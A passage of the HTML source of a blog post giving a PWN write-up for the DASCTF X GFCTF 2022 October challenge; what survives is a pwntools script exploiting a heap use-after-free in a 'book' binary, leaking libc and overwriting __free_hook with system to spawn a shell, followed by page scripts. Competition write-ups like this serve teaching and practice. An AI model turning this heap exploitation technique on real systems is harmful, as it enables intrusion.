class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><span class="hljs-comment">#io = process(&#x27;./book&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;/home/su/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice : &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice : &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uaf</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice : &#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>  add(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>  add(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#1</span><br>  add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>)  <span class="hljs-comment">#2</span><br>  payload = p64(<span class="hljs-number">0xdeadbeef</span>) * <span class="hljs-number">14</span> + p64(<span class="hljs-number">0x180</span>) + p64(<span class="hljs-number">0x90</span>)<br>  add(<span class="hljs-number">0x100</span>,payload) <span class="hljs-comment">#3</span><br><br>  <span class="hljs-comment">#gdb.attach(io)</span><br>  <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>      add(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <br><br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-number">10</span>):<br>      free(i)<br>  <span class="hljs-comment">#gdb.attach(io)</span><br>  uaf(<span class="hljs-number">1</span>)<br>  free(<span class="hljs-number">0</span>)<br>  add(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#10</span><br>  free(<span class="hljs-number">1</span>)<br>  add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#11</span><br>  add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#12</span><br>  payload = <span class="hljs-string">b&#x27;\xa0\x56&#x27;</span><br>  <span class="hljs-comment">#gdb.attach(io)</span><br>  add(<span class="hljs-number">0x90</span>,payload) <span class="hljs-comment">#13</span><br><br>  payload = p64(<span class="hljs-number">0xdeadbeef</span>) *<span class="hljs-number">18</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x180</span>)<br>  add(<span class="hljs-number">0x100</span>,payload) <span class="hljs-comment">#14</span><br>  payload = p64(<span class="hljs-number">0xfbad1887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x08&#x27;</span><br>  add(<span class="hljs-number">0x100</span>,payload) <span class="hljs-comment">#15</span><br>  libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1c6980</span><br>  <span class="hljs-comment">#pause()</span><br>  <span class="hljs-keyword">if</span> (libc_base &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>  success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>  free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x25000</span><br>  system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - <span class="hljs-number">0x25000</span><br>  free(<span class="hljs-number">12</span>)<br>  free(<span class="hljs-number">2</span>)<br><br>  payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x90</span>) + p64(free_hook)<br>  add(<span class="hljs-number">0xb0</span>,payload) <span class="hljs-comment">#16</span><br>  add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#17</span><br>  add(<span class="hljs-number">0x80</span>,p64(system))<br>  free(<span class="hljs-number">17</span>)<br>  io.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        io = process(<span class="hljs-string">&#x27;./book&#x27;</span>)<br>        <span class="hljs-keyword">if</span> pwn():<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        io.close()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E8%B5%9B%E9%A2%98WP/" class="category-chain-item">赛题WP</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="print-no-link">#赛题复现</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DASCTF X GFCTF 2022十月挑战赛-PWN-WP</div>
+      <div>https://ch13hh.github.io/2024/07/27/DASCTF X GFCTF 2022十月挑战赛-PWN-WP/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/01/glibc.2.24-2.26%E2%80%94%E2%80%94house%20of%20orange/" title="glibc.2.24-2.26——house of orange">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">glibc.2.24-2.26——house of orange</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/" title="常回家看看之off_by_one">
+                        <span class="hidden-mobile">常回家看看之off_by_one</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","appKey":"idRJngxDPrsuLA4G1dKyEewP","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
